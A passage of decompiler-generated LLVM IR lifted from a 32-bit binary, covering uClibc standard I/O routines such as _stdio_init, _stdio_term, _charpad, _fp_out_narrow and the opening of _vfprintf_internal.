dec_label_pc_10009a1c:                            ; preds = %dec_label_pc_10009988, %dec_label_pc_10009a00, %dec_label_pc_10009a18
  %v0_10009a1c = load i32, i32* @r31, align 4
  %v1_10009a1c = inttoptr i32 %v0_10009a1c to i16*
  %v2_10009a1c = load i16, i16* %v1_10009a1c, align 2
  %v3_10009a1c = zext i16 %v2_10009a1c to i32
  store i32 %v3_10009a1c, i32* %r0.global-to-local, align 4
  %v1_10009a20 = add i32 %v0_10009a1c, 8
  %v2_10009a20 = inttoptr i32 %v1_10009a20 to i32*
  %v3_10009a20 = load i32, i32* %v2_10009a20, align 4
  store i32 %v3_10009a20, i32* %r9.global-to-local, align 4
  %v1_10009a24 = and i32 %v3_10009a1c, 8192
  store i32 %v1_10009a24, i32* @r11, align 4
  %v3_10009a24 = icmp eq i32 %v1_10009a24, 0
  store i1 %v3_10009a24, i1* %cr0_eq.global-to-local, align 1
  %v3_10009a2c = add i32 %v0_10009a1c, 2
  %v4_10009a2c = inttoptr i32 %v3_10009a2c to i8*
  store i8 0, i8* %v4_10009a2c, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10009a34 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009a34 = load i32, i32* @r31, align 4
  %v2_10009a34 = add i32 %v1_10009a34, 20
  %v3_10009a34 = inttoptr i32 %v2_10009a34 to i32*
  store i32 %v0_10009a34, i32* %v3_10009a34, align 4
  %v0_10009a38 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009a38 = load i32, i32* @r31, align 4
  %v2_10009a38 = add i32 %v1_10009a38, 24
  %v3_10009a38 = inttoptr i32 %v2_10009a38 to i32*
  store i32 %v0_10009a38, i32* %v3_10009a38, align 4
  %v0_10009a3c = load i32, i32* %r9.global-to-local, align 4
  %v1_10009a3c = load i32, i32* @r31, align 4
  %v2_10009a3c = add i32 %v1_10009a3c, 28
  %v3_10009a3c = inttoptr i32 %v2_10009a3c to i32*
  store i32 %v0_10009a3c, i32* %v3_10009a3c, align 4
  %v0_10009a40 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009a40 = load i32, i32* @r31, align 4
  %v2_10009a40 = add i32 %v1_10009a40, 16
  %v3_10009a40 = inttoptr i32 %v2_10009a40 to i32*
  store i32 %v0_10009a40, i32* %v3_10009a40, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v0_10009a48 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009a48 = load i32, i32* @r31, align 4
  %v2_10009a48 = add i32 %v1_10009a48, 44
  %v3_10009a48 = inttoptr i32 %v2_10009a48 to i32*
  store i32 %v0_10009a48, i32* %v3_10009a48, align 4
  %v3_10009a4c = load i32, i32* @global_var_1002c2c0.142, align 4
  store i32 %v3_10009a4c, i32* %r0.global-to-local, align 4
  %v1_10009a50 = load i32, i32* @r31, align 4
  %v2_10009a50 = add i32 %v1_10009a50, 52
  %v3_10009a50 = inttoptr i32 %v2_10009a50 to i32*
  store i32 %v3_10009a4c, i32* %v3_10009a50, align 4
  %v0_10009a54 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10009a54, label %dec_label_pc_10009ad8, label %dec_label_pc_10009a58

dec_label_pc_10009a58:                            ; preds = %dec_label_pc_10009a1c
  store i32 268461856, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002bf18.278 to i32), i32* %r29.global-to-local, align 4
  %v2_10009a68 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10009a68, i32* @r26, align 4
  %v4_10009a78 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 268461856, i32 ptrtoint (i32* @global_var_1002bf18.278 to i32))
  %v2_10009a84 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10009a84, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1002bf00.283 to i32), i32* @r29, align 4
  store i32 268475024, i32* @lr, align 4
  %v1_10009a8c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002bf18.278 to i32))
  %v0_10009a90 = load i32, i32* @r28, align 4
  %v0_10009a94 = load i32, i32* @r29, align 4
  %v4_10009a9c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_10009a90, i32 %v0_10009a94)
  %v0_10009aa0 = load i32, i32* @r29, align 4
  store i32 268475048, i32* @lr, align 4
  %v1_10009aa4 = call i32 @pthread_mutex_lock(i32 %v0_10009aa0)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10009aac = load i32, i32* bitcast (i32** @global_var_1002c2bc.141 to i32*), align 4
  store i32 %v3_10009aac, i32* %r0.global-to-local, align 4
  store i32 %v2_10009a84, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_10009ab8 = load i32, i32* @r31, align 4
  %v2_10009ab8 = add i32 %v1_10009ab8, 32
  %v3_10009ab8 = inttoptr i32 %v2_10009ab8 to i32*
  store i32 %v3_10009aac, i32* %v3_10009ab8, align 4
  %v0_10009abc = load i32, i32* @r31, align 4
  store i32 %v0_10009abc, i32* bitcast (i32** @global_var_1002c2bc.141 to i32*), align 4
  store i32 268475076, i32* @lr, align 4
  %v0_10009ac0 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v2_10009a68, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10009ad0.284 to i32), i32* @lr, align 4
  %v0_10009acc = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_10009ad8

dec_label_pc_10009ad4:                            ; preds = %dec_label_pc_10009888, %dec_label_pc_10009874, %dec_label_pc_10009894
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10009ad8

dec_label_pc_10009ad8:                            ; preds = %dec_label_pc_10009a1c, %dec_label_pc_100098d4, %dec_label_pc_10009a58, %dec_label_pc_10009ad4
  store i32 %v0_10009834, i32* %r0.global-to-local, align 4
  %v0_10009adc = load i32, i32* @r31, align 4
  ret i32 %v0_10009adc

; uselistorder directives
  uselistorder i32 %v1_10009a18, { 2, 0, 1 }
  uselistorder i32 %v0_1000998c, { 1, 0 }
  uselistorder i32 %v0_100098d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100098c4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 16384, { 1, 0 }
  uselistorder i8 98, { 1, 0 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10009ad8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10009ad4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009a1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009968, { 1, 0 }
  uselistorder label %dec_label_pc_100098fc, { 1, 0 }
  uselistorder label %dec_label_pc_100098cc, { 1, 0 }
  uselistorder label %dec_label_pc_100098b8, { 1, 0 }
  uselistorder label %dec_label_pc_100098a4, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r28, align 4
  %v0_10009b04 = call i32 @__errno_location()
  store i32 %v0_10009b04, i32* @r26, align 4
  %v1_10009b10 = inttoptr i32 %v0_10009b04 to i32*
  %v2_10009b10 = load i32, i32* %v1_10009b10, align 4
  store i32 %v2_10009b10, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_1002bf30.140 to i32), i32* @r27, align 4
  %v3_10009b18 = load i16, i16* @global_var_1002bf30.140, align 2
  %v4_10009b18 = zext i16 %v3_10009b18 to i32
  store i32 %v4_10009b18, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009b20.285 to i32), i32* @lr, align 4
  %v1_10009b1c = call i32 @isatty(i32 0)
  %v1_10009b20 = sub i32 1, %v1_10009b1c
  %v1_10009b24 = mul i32 %v1_10009b20, 256
  %v0_10009b28 = load i32, i32* @r29, align 4
  %v2_10009b28 = xor i32 %v1_10009b24, %v0_10009b28
  %v1_10009b30 = trunc i32 %v2_10009b28 to i16
  store i16 %v1_10009b30, i16* @global_var_1002bf30.140, align 2
  %v3_10009b34 = load i16, i16* @global_var_1002bf80.276, align 2
  %v4_10009b34 = zext i16 %v3_10009b34 to i32
  store i32 %v4_10009b34, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009b3c.286 to i32), i32* @lr, align 4
  %v1_10009b38 = call i32 @isatty(i32 1)
  %v1_10009b3c = sub i32 1, %v1_10009b38
  %v1_10009b40 = mul i32 %v1_10009b3c, 256
  %v0_10009b44 = load i32, i32* @r29, align 4
  %v2_10009b44 = xor i32 %v1_10009b40, %v0_10009b44
  %v1_10009b48 = trunc i32 %v2_10009b44 to i16
  store i16 %v1_10009b48, i16* @global_var_1002bf80.276, align 2
  %v0_10009b4c = load i32, i32* @r25, align 4
  %v1_10009b4c = load i32, i32* @r26, align 4
  %v2_10009b4c = inttoptr i32 %v1_10009b4c to i32*
  store i32 %v0_10009b4c, i32* %v2_10009b4c, align 4
  ret i32 %v1_10009b40

; uselistorder directives
  uselistorder i32 %v1_10009b40, { 1, 0 }
  uselistorder i16* @global_var_1002bf80.276, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10015fe8.287 to i32), i32* @r4, align 4
  %v0_10009b70 = call i32 @memcpy()
  ret i32 %v0_10009b70
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002bf00.283 to i32), i32* @r3, align 4
  store i32 268475280, i32* @lr, align 4
  %v0_10009b8c = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1002bf18.278 to i32), i32* @r3, align 4
  store i32 268475292, i32* @lr, align 4
  %v0_10009b98 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_1002c2bc.141 to i32*), align 4
  %v3_10009be49 = icmp eq i32 %storemerge6, 0
  %v1_10009be811 = add i32 %storemerge6, 56
  store i32 %v1_10009be811, i32* @r30, align 4
  br i1 %v3_10009be49, label %dec_label_pc_10009bf4, label %dec_label_pc_10009ba8

dec_label_pc_10009ba8:                            ; preds = %entry, %dec_label_pc_10009bd4
  %v0_10009ba8 = phi i32 [ %v1_10009be8, %dec_label_pc_10009bd4 ], [ %v1_10009be811, %entry ]
  store i32 268475308, i32* @lr, align 4
  %v1_10009ba8 = call i32 @pthread_mutex_trylock(i32 %v0_10009ba8)
  %v3_10009bac = icmp eq i32 %v1_10009ba8, 0
  %v0_10009bb0 = load i32, i32* @r30, align 4
  store i32 %v0_10009bb0, i32* @r3, align 4
  br i1 %v3_10009bac, label %dec_label_pc_10009bd4, label %dec_label_pc_10009bb8

dec_label_pc_10009bb8:                            ; preds = %dec_label_pc_10009ba8
  %v0_10009bb8 = load i32, i32* @r31, align 4
  %v1_10009bb8 = add i32 %v0_10009bb8, 8
  %v2_10009bb8 = inttoptr i32 %v1_10009bb8 to i32*
  %v3_10009bb8 = load i32, i32* %v2_10009bb8, align 4
  store i32 %v3_10009bb8, i32* %r9.global-to-local, align 4
  %v3_10009bc0 = inttoptr i32 %v0_10009bb8 to i16*
  store i16 48, i16* %v3_10009bc0, align 2
  %v0_10009bc4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009bc4 = load i32, i32* @r31, align 4
  %v2_10009bc4 = add i32 %v1_10009bc4, 20
  %v3_10009bc4 = inttoptr i32 %v2_10009bc4 to i32*
  store i32 %v0_10009bc4, i32* %v3_10009bc4, align 4
  %v0_10009bc8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009bc8 = load i32, i32* @r31, align 4
  %v2_10009bc8 = add i32 %v1_10009bc8, 24
  %v3_10009bc8 = inttoptr i32 %v2_10009bc8 to i32*
  store i32 %v0_10009bc8, i32* %v3_10009bc8, align 4
  %v0_10009bcc = load i32, i32* %r9.global-to-local, align 4
  %v1_10009bcc = load i32, i32* @r31, align 4
  %v2_10009bcc = add i32 %v1_10009bcc, 28
  %v3_10009bcc = inttoptr i32 %v2_10009bcc to i32*
  store i32 %v0_10009bcc, i32* %v3_10009bcc, align 4
  %v0_10009bd0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009bd0 = load i32, i32* @r31, align 4
  %v2_10009bd0 = add i32 %v1_10009bd0, 16
  %v3_10009bd0 = inttoptr i32 %v2_10009bd0 to i32*
  store i32 %v0_10009bd0, i32* %v3_10009bd0, align 4
  br label %dec_label_pc_10009bd4

dec_label_pc_10009bd4:                            ; preds = %dec_label_pc_10009ba8, %dec_label_pc_10009bb8
  %v1_10009bd8 = load i32, i32* @r31, align 4
  %v2_10009bd8 = add i32 %v1_10009bd8, 52
  %v3_10009bd8 = inttoptr i32 %v2_10009bd8 to i32*
  store i32 1, i32* %v3_10009bd8, align 4
  store i32 268475360, i32* @lr, align 4
  %v0_10009bdc = call i32 @__stdio_init_mutex()
  %v0_10009be0 = load i32, i32* @r31, align 4
  %v1_10009be0 = add i32 %v0_10009be0, 32
  %v2_10009be0 = inttoptr i32 %v1_10009be0 to i32*
  %storemerge = load i32, i32* %v2_10009be0, align 4
  %v3_10009be4 = icmp eq i32 %storemerge, 0
  %v1_10009be8 = add i32 %storemerge, 56
  store i32 %v1_10009be8, i32* @r30, align 4
  br i1 %v3_10009be4, label %dec_label_pc_10009be4.dec_label_pc_10009bf4_crit_edge, label %dec_label_pc_10009ba8

dec_label_pc_10009be4.dec_label_pc_10009bf4_crit_edge: ; preds = %dec_label_pc_10009bd4
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1002c2bc.141 to i32*), align 4
  br label %dec_label_pc_10009bf4

dec_label_pc_10009bf4:                            ; preds = %dec_label_pc_10009be4.dec_label_pc_10009bf4_crit_edge, %entry
  %v0_10009c3017 = phi i32 [ %v1_10009be8, %dec_label_pc_10009be4.dec_label_pc_10009bf4_crit_edge ], [ %v1_10009be811, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_10009be4.dec_label_pc_10009bf4_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_10009c185 = icmp eq i32 %storemerge12, 0
  br i1 %v3_10009c185, label %dec_label_pc_10009c20, label %dec_label_pc_10009c00

dec_label_pc_10009c00:                            ; preds = %dec_label_pc_10009bf4, %dec_label_pc_10009c14
  %v0_10009c00 = phi i32 [ %storemerge1, %dec_label_pc_10009c14 ], [ %storemerge12, %dec_label_pc_10009bf4 ]
  %v1_10009c00 = inttoptr i32 %v0_10009c00 to i16*
  %v2_10009c00 = load i16, i16* %v1_10009c00, align 2
  %v3_10009c00 = zext i16 %v2_10009c00 to i32
  store i32 %v0_10009c00, i32* @r3, align 4
  %v1_10009c08 = and i32 %v3_10009c00, 64
  store i32 %v1_10009c08, i32* %r9.global-to-local, align 4
  %v3_10009c08 = icmp eq i32 %v1_10009c08, 0
  br i1 %v3_10009c08, label %dec_label_pc_10009c14, label %dec_label_pc_10009c10

dec_label_pc_10009c10:                            ; preds = %dec_label_pc_10009c00
  store i32 268475412, i32* @lr, align 4
  %v0_10009c10 = call i32 @__stdio_wcommit()
  %v0_10009c14.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009c14

dec_label_pc_10009c14:                            ; preds = %dec_label_pc_10009c00, %dec_label_pc_10009c10
  %v0_10009c14 = phi i32 [ %v0_10009c00, %dec_label_pc_10009c00 ], [ %v0_10009c14.pre, %dec_label_pc_10009c10 ]
  %v0_10009c3018 = phi i32 [ %v0_10009c00, %dec_label_pc_10009c00 ], [ %v0_10009c10, %dec_label_pc_10009c10 ]
  %v1_10009c14 = add i32 %v0_10009c14, 32
  %v2_10009c14 = inttoptr i32 %v1_10009c14 to i32*
  %storemerge1 = load i32, i32* %v2_10009c14, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_10009c18 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10009c18, label %dec_label_pc_10009c20, label %dec_label_pc_10009c00

dec_label_pc_10009c20:                            ; preds = %dec_label_pc_10009c14, %dec_label_pc_10009bf4
  %v0_10009c30 = phi i32 [ %v0_10009c3017, %dec_label_pc_10009bf4 ], [ %v0_10009c3018, %dec_label_pc_10009c14 ]
  ret i32 %v0_10009c30

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_10009c00, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 %v1_10009be8, { 0, 2, 1 }
  uselistorder i32 %v1_10009be811, { 1, 0, 2 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_10009c14, { 1, 0 }
  uselistorder label %dec_label_pc_10009c00, { 1, 0 }
  uselistorder label %dec_label_pc_10009bd4, { 1, 0 }
  uselistorder label %dec_label_pc_10009ba8, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_10009c3c = load i32, i32* @r31, align 4
  %v0_10009c40 = load i32, i32* @r3, align 4
  %v1_10009c48 = add i32 %v0_10009c40, 8
  %v2_10009c48 = inttoptr i32 %v1_10009c48 to i32*
  %v3_10009c48 = load i32, i32* %v2_10009c48, align 4
  %v1_10009c4c = add i32 %v0_10009c40, 16
  %v2_10009c4c = inttoptr i32 %v1_10009c4c to i32*
  %v3_10009c4c = load i32, i32* %v2_10009c4c, align 4
  %v2_10009c54 = sub i32 %v3_10009c4c, %v3_10009c48
  store i32 %v2_10009c54, i32* @r5, align 4
  %v5_10009c54 = icmp eq i32 %v2_10009c54, 0
  br i1 %v5_10009c54, label %dec_label_pc_10009c64, label %dec_label_pc_10009c5c

dec_label_pc_10009c5c:                            ; preds = %entry
  store i32 %v3_10009c48, i32* %v2_10009c4c, align 4
  store i32 268475492, i32* @lr, align 4
  %v2_10009c60 = inttoptr i32 %v3_10009c48 to i16*
  %v3_10009c60 = call i32 @__stdio_WRITE(i16* %v2_10009c60, i32 %v2_10009c54)
  %v0_10009c64.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009c64

dec_label_pc_10009c64:                            ; preds = %entry, %dec_label_pc_10009c5c
  %v0_10009c64 = phi i32 [ %v0_10009c40, %entry ], [ %v0_10009c64.pre, %dec_label_pc_10009c5c ]
  %v1_10009c64 = add i32 %v0_10009c64, 8
  %v2_10009c64 = inttoptr i32 %v1_10009c64 to i32*
  %v3_10009c64 = load i32, i32* %v2_10009c64, align 4
  %v1_10009c68 = add i32 %v0_10009c64, 16
  %v2_10009c68 = inttoptr i32 %v1_10009c68 to i32*
  %v3_10009c68 = load i32, i32* %v2_10009c68, align 4
  store i32 %v0_10009c3c, i32* @r31, align 4
  %v2_10009c70 = sub i32 %v3_10009c68, %v3_10009c64
  ret i32 %v2_10009c70

; uselistorder directives
  uselistorder i32 %v0_10009c64, { 1, 0 }
  uselistorder i32 %v3_10009c48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009c64, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_10009cac3 = icmp eq i32 %arg3, 0
  %v2_10009cb0 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_10009cac3, label %dec_label_pc_10009ccc, label %dec_label_pc_10009cc0

dec_label_pc_10009ca8:                            ; preds = %dec_label_pc_10009cc0
  %v1_10009ca8 = add i32 %v0_10009ca8, -1
  store i32 %v1_10009ca8, i32* @r31, align 4
  %v3_10009cac = icmp eq i32 %v1_10009ca8, 0
  %v0_10009cb8 = load i32, i32* @r29, align 4
  br i1 %v3_10009cac, label %dec_label_pc_10009ccc.loopexit, label %dec_label_pc_10009cc0

dec_label_pc_10009cc0:                            ; preds = %entry, %dec_label_pc_10009ca8
  %v0_10009cb85 = phi i32 [ %v0_10009cb8, %dec_label_pc_10009ca8 ], [ %arg1, %entry ]
  store i32 268475588, i32* @lr, align 4
  %v3_10009cc0 = inttoptr i32 %v0_10009cb85 to i16*
  %v4_10009cc0 = call i32 @__stdio_fwrite(i32 %v2_10009cb0, i32 1, i16* %v3_10009cc0)
  %v3_10009cc4 = icmp eq i32 %v4_10009cc0, 1
  %v0_10009ca8 = load i32, i32* @r31, align 4
  br i1 %v3_10009cc4, label %dec_label_pc_10009ca8, label %dec_label_pc_10009ccc.loopexit

dec_label_pc_10009ccc.loopexit:                   ; preds = %dec_label_pc_10009ca8, %dec_label_pc_10009cc0
  %v0_10009cd0.ph = phi i32 [ %v0_10009ca8, %dec_label_pc_10009cc0 ], [ 0, %dec_label_pc_10009ca8 ]
  %v1_10009cd0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009ccc

dec_label_pc_10009ccc:                            ; preds = %dec_label_pc_10009ccc.loopexit, %entry
  %v1_10009cd0 = phi i32 [ 0, %entry ], [ %v1_10009cd0.pre, %dec_label_pc_10009ccc.loopexit ]
  %v0_10009cd0 = phi i32 [ 0, %entry ], [ %v0_10009cd0.ph, %dec_label_pc_10009ccc.loopexit ]
  %v2_10009cd0 = sub i32 %v1_10009cd0, %v0_10009cd0
  ret i32 %v2_10009cd0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009ccc.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10009cc0, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_10009cf8 = and i32 %arg2, 128
  %v3_10009cf8 = icmp eq i32 %v1_10009cf8, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_10009cf8, label %dec_label_pc_10009d48, label %dec_label_pc_10009d14

dec_label_pc_10009d14:                            ; preds = %entry
  %v0_10009d14 = call i32 @__GI_strlen()
  %v0_10009d18 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10009d14, i32* @r31, align 4
  %v0_10009d20 = load i32, i32* %r26.global-to-local, align 4
  %v1_10009d24 = load i32, i32* %r30.global-to-local, align 4
  %v2_10009d24 = sub i32 %v1_10009d24, %v0_10009d14
  store i32 %v2_10009d24, i32* %r29.global-to-local, align 4
  store i32 %v0_10009d14, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_10009d24, 1
  br i1 %tmp7, label %dec_label_pc_10009d48, label %dec_label_pc_10009d34

dec_label_pc_10009d34:                            ; preds = %dec_label_pc_10009d14
  %v1_10009d18 = urem i32 %v0_10009d18, 128
  store i32 268475704, i32* @lr, align 4
  %v3_10009d34 = trunc i32 %v1_10009d18 to i8
  %v4_10009d34 = call i32 @_charpad(i32 %v0_10009d20, i8 %v3_10009d34, i32 %v2_10009d24)
  %v0_10009d38 = load i32, i32* @r31, align 4
  store i32 %v0_10009d38, i32* %r30.global-to-local, align 4
  %v1_10009d3c = load i32, i32* @r29, align 4
  %v4_10009d3c = icmp eq i32 %v4_10009d34, %v1_10009d3c
  store i32 %v4_10009d34, i32* @r28, align 4
  br i1 %v4_10009d3c, label %dec_label_pc_10009d34.dec_label_pc_10009d48_crit_edge, label %dec_label_pc_10009d6c

dec_label_pc_10009d34.dec_label_pc_10009d48_crit_edge: ; preds = %dec_label_pc_10009d34
  %v0_10009d54.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10009d48

dec_label_pc_10009d48:                            ; preds = %dec_label_pc_10009d34.dec_label_pc_10009d48_crit_edge, %dec_label_pc_10009d14, %entry
  %v0_10009d54 = phi i32 [ %v0_10009d54.pre, %dec_label_pc_10009d34.dec_label_pc_10009d48_crit_edge ], [ %v0_10009d20, %dec_label_pc_10009d14 ], [ %arg1, %entry ]
  %v0_10009d50 = phi i32 [ %v0_10009d38, %dec_label_pc_10009d34.dec_label_pc_10009d48_crit_edge ], [ %v0_10009d14, %dec_label_pc_10009d14 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_10009d50, 1
  br i1 %tmp8, label %dec_label_pc_10009d68, label %dec_label_pc_10009d60

dec_label_pc_10009d60:                            ; preds = %dec_label_pc_10009d48
  %v0_10009d4c = load i32, i32* @r27, align 4
  store i32 268475748, i32* @lr, align 4
  %v3_10009d60 = inttoptr i32 %v0_10009d54 to i16*
  %v4_10009d60 = call i32 @__stdio_fwrite(i32 %v0_10009d4c, i32 %v0_10009d50, i16* %v3_10009d60)
  br label %dec_label_pc_10009d68

dec_label_pc_10009d68:                            ; preds = %dec_label_pc_10009d48, %dec_label_pc_10009d60
  %v1_10009d68 = phi i32 [ 0, %dec_label_pc_10009d48 ], [ %v4_10009d60, %dec_label_pc_10009d60 ]
  %v0_10009d68 = load i32, i32* @r28, align 4
  %v2_10009d68 = add i32 %v0_10009d68, %v1_10009d68
  br label %dec_label_pc_10009d6c

dec_label_pc_10009d6c:                            ; preds = %dec_label_pc_10009d34, %dec_label_pc_10009d68
  %v0_10009d70 = phi i32 [ %v4_10009d34, %dec_label_pc_10009d34 ], [ %v2_10009d68, %dec_label_pc_10009d68 ]
  ret i32 %v0_10009d70

; uselistorder directives
  uselistorder i32 %v0_10009d50, { 1, 0 }
  uselistorder i32 %v2_10009d24, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10009d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10009d68, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_2()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_2()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_10009d88 = load i32, i32* @lr, align 4
  store i32 %v0_10009d88, i32* %r0.global-to-local, align 4
  %v2_10009d90 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_10009d90, i32* %r30.global-to-local, align 4
  %v0_10009d94 = load i32, i32* @r3, align 4
  store i32 %v0_10009d94, i32* %r24.global-to-local, align 4
  %v0_10009da0 = load i32, i32* @r5, align 4
  store i32 %v0_10009da0, i32* %r31.global-to-local, align 4
  %v0_10009da4 = load i32, i32* @r4, align 4
  store i32 %v0_10009da4, i32* @r29, align 4
  store i32 268475820, i32* @lr, align 4
  %v1_10009da8 = bitcast i8** %stack_var_-200 to i32*
  %v2_10009da8 = call i32 @_ppfs_init(i32* %v1_10009da8)
  %tmp72 = icmp sgt i32 %v2_10009da8, -1
  br i1 %tmp72, label %dec_label_pc_10009ddc, label %dec_label_pc_10009db4

dec_label_pc_10009db4:                            ; preds = %entry
  %v3_10009db4 = load i8*, i8** %stack_var_-200, align 4
  %v4_10009db4 = ptrtoint i8* %v3_10009db4 to i32
  store i32 %v4_10009db4, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_10009db4, i32* @r3, align 4
  %v0_10009dc0 = call i32 @__GI_strlen()
  %v3_10009dc4 = icmp eq i32 %v0_10009dc0, 0
  br i1 %v3_10009dc4, label %dec_label_pc_1000a3dc, label %dec_label_pc_10009dcc

dec_label_pc_10009dcc:                            ; preds = %dec_label_pc_10009db4
  %v0_10009dcc = load i32, i32* @r31, align 4
  %v0_10009dd0 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10009dd8.288 to i32), i32* @lr, align 4
  %v3_10009dd4 = inttoptr i32 %v0_10009dd0 to i16*
  %v4_10009dd4 = call i32 @__stdio_fwrite(i32 %v0_10009dcc, i32 %v0_10009dc0, i16* %v3_10009dd4)
  br label %dec_label_pc_1000a3dc

dec_label_pc_10009ddc:                            ; preds = %entry
